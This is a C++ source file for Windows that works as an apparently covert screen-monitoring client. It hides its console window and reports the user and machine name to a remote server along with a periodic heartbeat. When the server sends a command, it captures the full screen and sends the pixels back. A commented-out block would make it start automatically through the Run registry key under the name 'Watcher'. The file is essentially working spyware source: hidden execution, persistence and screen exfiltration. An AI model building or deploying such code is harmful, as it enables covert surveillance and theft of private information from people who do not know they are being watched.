#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <Lmcons.h>
#include <string>
#include <thread>
#include <chrono>
#include <vector>

#define SERVER_IP "127.0.0.1" 
#define SERVER_PORT 12345
#define TIME_PERIOD 5

void InitializeWinsock() {
    WSADATA wsData;
    WSAStartup(MAKEWORD(2, 2), &wsData);
}

std::string GetClientInfo() {
    char username[UNLEN + 1];
    char computerName[UNLEN + 1];
    DWORD usernameLen = UNLEN + 1;
    DWORD computerNameLen = UNLEN + 1;
    GetUserNameA(username, &usernameLen);
    GetComputerNameA(computerName, &computerNameLen);
    std::string clientInfo = "User:" + std::string(username) + ", Machine:" + std::string(computerName);
    return clientInfo;
}

HBITMAP CaptureScreenshot() {
    SetProcessDPIAware();
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMemory = CreateCompatibleDC(hdcScreen);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = screenWidth;
    bmi.bmiHeader.biHeight = -screenHeight;  
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    bmi.bmiHeader.biSizeImage = screenWidth * screenHeight * 4;

    void* pBits;
    HBITMAP hBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);

    if (hBitmap) {
        HGDIOBJ hOldBitmap = SelectObject(hdcMemory, hBitmap);

        SetStretchBltMode(hdcMemory, HALFTONE);
        BitBlt(hdcMemory, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

        SelectObject(hdcMemory, hOldBitmap);
    }

    DeleteDC(hdcMemory);
    ReleaseDC(NULL, hdcScreen);

    return hBitmap;
}

void SendScreenshot(SOCKET clientSocket) {
    const char* marker = "SCREENSHOT_BEGIN";
    send(clientSocket, marker, strlen(marker), 0);

    Sleep(100);

    HBITMAP hBitmap = CaptureScreenshot();
    if (!hBitmap) {
        return;
    }

    BITMAP bitmap;
    GetObject(hBitmap, sizeof(BITMAP), &bitmap);
    int imageSize = bitmap.bmWidth * bitmap.bmHeight * 4;
    std::vector<BYTE> buffer(imageSize);
    BITMAPINFOHEADER bi = { 0 };
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bitmap.bmWidth;
    bi.biHeight = -bitmap.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = imageSize;

    HDC hdc = GetDC(NULL);

    if (GetDIBits(hdc, hBitmap, 0, bitmap.bmHeight, buffer.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS)) {

#pragma pack(push, 1)
        struct {
            uint32_t width;
            uint32_t height;
            uint32_t bitsPerPixel;
            uint32_t dataSize;
        } metadata = {
            static_cast<uint32_t>(bitmap.bmWidth),
            static_cast<uint32_t>(bitmap.bmHeight),
            32,
            static_cast<uint32_t>(imageSize)
        };
#pragma pack(pop)

        send(clientSocket, (char*)&metadata, sizeof(metadata), 0);

        const char* imageData = reinterpret_cast<const char*>(buffer.data());
        int totalSent = 0;
        while (totalSent < imageSize) {
            int chunkSize = min(8192, imageSize - totalSent);
            int sent = send(clientSocket, imageData + totalSent, chunkSize, 0);
            if (sent == SOCKET_ERROR) {
                break;
            }
            totalSent += sent;
        }
    }


    ReleaseDC(NULL, hdc);
    DeleteObject(hBitmap);

    Sleep(100);

    const char* endMarker = "SCREENSHOT_END";
    send(clientSocket, endMarker, strlen(endMarker), 0);
}


void SendActivityData(SOCKET clientSocket) {
    while (true) {
        std::string activityData = "Activity:" + std::to_string(time(nullptr));
        send(clientSocket, activityData.c_str(), activityData.size(), 0);
        std::this_thread::sleep_for(std::chrono::seconds(TIME_PERIOD));
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    /* Разкоментить и поставить нужный appPath
    HKEY hKey;
    const char* appPath = "\"C:\\...\"";
    const char* keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "Watcher", 0, REG_SZ, (BYTE*)appPath, strlen(appPath) + 1);
        RegCloseKey(hKey);
    }
    */

    InitializeWinsock();
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == 0) {
        std::string clientInfo = GetClientInfo();
        send(clientSocket, clientInfo.c_str(), clientInfo.size(), 0);
        std::thread activityThread(SendActivityData, clientSocket);
        activityThread.detach();
        char buffer[1024];
        while (true) {
            int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
            if (bytesReceived > 0) {
                std::string command(buffer, bytesReceived);
                if (command == "SCREENSHOT") {
                    SendScreenshot(clientSocket);
                }
            }
        }
    }

    closesocket(clientSocket);
    WSACleanup();
    return 0;
}
